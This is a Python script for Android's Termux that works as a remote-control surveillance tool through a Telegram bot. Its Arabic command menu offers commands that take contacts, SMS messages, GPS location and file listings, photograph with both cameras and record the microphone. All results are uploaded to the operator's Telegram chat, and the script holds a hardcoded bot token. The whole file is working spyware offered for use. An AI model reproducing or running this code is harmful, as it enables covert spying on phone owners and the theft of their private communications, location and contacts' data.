import os
import subprocess
import time
import requests

TOKEN = "8735606971:AAEA5enYqV4mCtbRTXbYBPTkWJDPitPH9Y4"
URL = f"https://api.telegram.org/bot{TOKEN}/"

BASE_DIR = "/sdcard/Download/telegram_files"
if not os.path.exists(BASE_DIR):
    os.makedirs(BASE_DIR)

is_recording_audio = False

def get_updates(offset=None):
    try:
        url = URL + "getUpdates"
        if offset:
            url += f"?offset={offset}"
        response = requests.get(url, timeout=10)
        return response.json()
    except:
        return None

def send_message(chat_id, text):
    try:
        url = URL + f"sendMessage?chat_id={chat_id}&text={text}"
        requests.get(url, timeout=10)
    except:
        pass

def send_document(chat_id, file_path):
    try:
        url = URL + f"sendDocument?chat_id={chat_id}"
        with open(file_path, 'rb') as f:
            files = {'document': f}
            requests.post(url, files=files, timeout=30)
    except Exception as e:
        send_message(chat_id, f"خطأ في إرسال الملف: {e}")

def send_photo(chat_id, file_path):
    try:
        url = URL + f"sendPhoto?chat_id={chat_id}"
        with open(file_path, 'rb') as f:
            files = {'photo': f}
            requests.post(url, files=files, timeout=30)
    except:
        pass

def main():
    global is_recording_audio
    print("[*] Bot is running and waiting for commands...")
    last_update_id = None
    
    while True:
        try:
            updates = get_updates(last_update_id)
            if updates and "result" in updates:
                for update in updates["result"]:
                    last_update_id = update["update_id"] + 1
                    
                    if "message" in update:
                        chat_id = update["message"]["chat"]["id"]
                        text = update["message"].get("text", "")
                        
                        print(f"[-] Received command: {text}")
                        
                        if text == "/start":
                            help_text = (
                                "لوحة السيطرة المحدثة:\n"
                                "/contacts - سحب جهات الاتصال كاملة\n"
                                "/sms - سحب كافة الرسائل النصية (بترميز واضح)\n"
                                "/location - جلب إحداثيات الموقع (تأكد من GPS)\n"
                                "/storage - استعراض ملفات التخزين\n"
                                "/cam_front - الكاميرا الأمامية\n"
                                "/cam_back - الكاميرا الخلفية\n"
                                "/audio_start - بدء التسجيل الصوتي\n"
                                "/audio_stop - إيقاف وإرسال التسجيل الصوتي"
                            )
                            send_message(chat_id, help_text)
                            
                        elif text == "/contacts":
                            folder = os.path.join(BASE_DIR, "contacts")
                            os.makedirs(folder, exist_ok=True)
                            file_path = os.path.join(folder, "contacts.json")
                            send_message(chat_id, "جاري سحب جهات الاتصال...")
                            subprocess.run(f"termux-contact-list > {file_path}", shell=True)
                            if os.path.exists(file_path) and os.path.getsize(file_path) > 2:
                                send_document(chat_id, file_path)
                            else:
                                send_message(chat_id, "فشل السحب. تحقق من إذن جهات الاتصال.")
                                
                        elif text == "/sms":
                            folder = os.path.join(BASE_DIR, "sms")
                            os.makedirs(folder, exist_ok=True)
                            file_path = os.path.join(folder, "messages.json")
                            send_message(chat_id, "جاري سحب كافة الرسائل النصية...")
                            
                            result = subprocess.run("termux-sms-list -l 1000", shell=True, capture_output=True, text=True, encoding='utf-8')
                            with open(file_path, "w", encoding="utf-8") as f:
                                f.write(result.stdout)
                                
                            if os.path.exists(file_path) and os.path.getsize(file_path) > 2:
                                send_document(chat_id, file_path)
                            else:
                                send_message(chat_id, "تعذر سحب الرسائل أو لا توجد صلاحيات SMS.")

                        elif text == "/location":
                            folder = os.path.join(BASE_DIR, "location")
                            os.makedirs(folder, exist_ok=True)
                            file_path = os.path.join(folder, "location.json")
                            send_message(chat_id, "جاري جلب إحداثيات الموقع...")
                            subprocess.run(f"termux-location -p gps > {file_path}", shell=True)
                            if os.path.exists(file_path) and os.path.getsize(file_path) > 2:
                                send_document(chat_id, file_path)
                            else:
                                send_message(chat_id, "تعذر جلب الموقع. تأكد من تشغيل GPS وإذن الموقع لتطبيق Termux.")

                        elif text == "/storage":
                            folder = os.path.join(BASE_DIR, "storage")
                            os.makedirs(folder, exist_ok=True)
                            file_path = os.path.join(folder, "storage_list.txt")
                            send_message(chat_id, "جاري جلب قائمة الملفات والتخزين...")
                            subprocess.run(f"ls -la /sdcard > {file_path}", shell=True)
                            send_document(chat_id, file_path)

                        elif text == "/cam_front":
                            folder = os.path.join(BASE_DIR, "camera")
                            os.makedirs(folder, exist_ok=True)
                            file_path = os.path.join(folder, "front.jpg")
                            send_message(chat_id, "التقاط صورة بالكاميرا الأمامية...")
                            subprocess.run(f"termux-camera-photo -c 1 {file_path}", shell=True)
                            if os.path.exists(file_path):
                                send_photo(chat_id, file_path)
                            else:
                                send_message(chat_id, "تعذر التقاط الصورة.")

                        elif text == "/cam_back":
                            folder = os.path.join(BASE_DIR, "camera")
                            os.makedirs(folder, exist_ok=True)
                            file_path = os.path.join(folder, "back.jpg")
                            send_message(chat_id, "التقاط صورة بالكاميرا الخلفية...")
                            subprocess.run(f"termux-camera-photo -c 0 {file_path}", shell=True)
                            if os.path.exists(file_path):
                                send_photo(chat_id, file_path)
                            else:
                                send_message(chat_id, "تعذر التقاط الصورة.")

                        elif text == "/audio_start":
                            if not is_recording_audio:
                                is_recording_audio = True
                                folder = os.path.join(BASE_DIR, "audio")
                                os.makedirs(folder, exist_ok=True)
                                file_path = os.path.join(folder, "record.aac")
                                send_message(chat_id, "بدء التسجيل الصوتي المفتوح... أرسل /audio_stop للإيقاف.")
                                subprocess.Popen(f"termux-microphone-record -f {file_path}", shell=True)
                            else:
                                send_message(chat_id, "التسجيل يعمل بالفعل!")

                        elif text == "/audio_stop":
                            if is_recording_audio:
                                subprocess.run("termux-microphone-record -q", shell=True)
                                is_recording_audio = False
                                send_message(chat_id, "تم إيقاف التسجيل، جاري إرسال الملف...")
                                time.sleep(2)
                                file_path = os.path.join(BASE_DIR, "audio", "record.aac")
                                if os.path.exists(file_path):
                                    send_document(chat_id, file_path)
                                else:
                                    send_message(chat_id, "لم يتم العثور على ملف التسجيل.")
                            else:
                                send_message(chat_id, "التسجيل متوقف أصلاً.")

                        else:
                            send_message(chat_id, "أمر غير معروف. اكتب /start لعرض القائمة.")
        except Exception as e:
            print(f"Loop error: {e}")
        
        time.sleep(2)

if __name__ == "__main__":
    main()
